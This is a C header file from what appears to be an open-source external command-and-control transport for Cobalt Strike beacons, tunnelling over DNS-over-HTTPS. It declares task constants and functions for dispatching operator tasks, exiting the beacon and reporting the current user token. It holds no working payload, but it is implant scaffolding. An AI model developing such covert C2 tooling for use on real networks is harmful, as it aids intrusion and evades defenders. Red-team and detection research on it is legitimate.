/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

#define BEACON_TASK_STRING_CALLBACK	0

#define BEACON_TASK_EXIT_REQUEST	3
#define BEACON_TASK_EXIT_CALLBACK	26

#define BEACON_TASK_USER_REQUEST	27
#define BEACON_TASK_USER_CALLBACK	16

/*-
 *
 * BeaconTask
 *
 * Purpose:
 *
 * Executes the requested task, and returns
 * an unencryptes response to send to Team
 * Server.
 *
-*/
DEFINESEC(B) PBEACON_TASK_RES_HDR BeaconTask( PBEACON_INSTANCE Ins, PBEACON_TASK_REQ_BUF Req );

/*-
 *
 * BeaconTaskExit
 *
 * Purpose:
 *
 * Exits beacon.
 *
-*/
DEFINESEC(B) ULONG BeaconTaskExit( PBEACON_INSTANCE Ins, PVOID Buf, PBEACON_TASK_RES_HDR * Hdr );

/*-
 *
 * BeaconTaskNone
 *
 * Purpose:
 *
 * Returns an error string for
 * unknown commands.
 *
-*/
DEFINESEC(B) ULONG BeaconTaskNone( PBEACON_INSTANCE Ins, PVOID Buf, PBEACON_TASK_RES_HDR * Hdr );

/*
 *
 * BeaconTaskUser
 *
 * Purpose:
 *
 * Returns the username of the current
 * token.
 *
-*/
DEFINESEC(B) ULONG BeaconTaskUser( PBEACON_INSTANCE Ins, PVOID Buf, PBEACON_TASK_RES_HDR * Hdr );
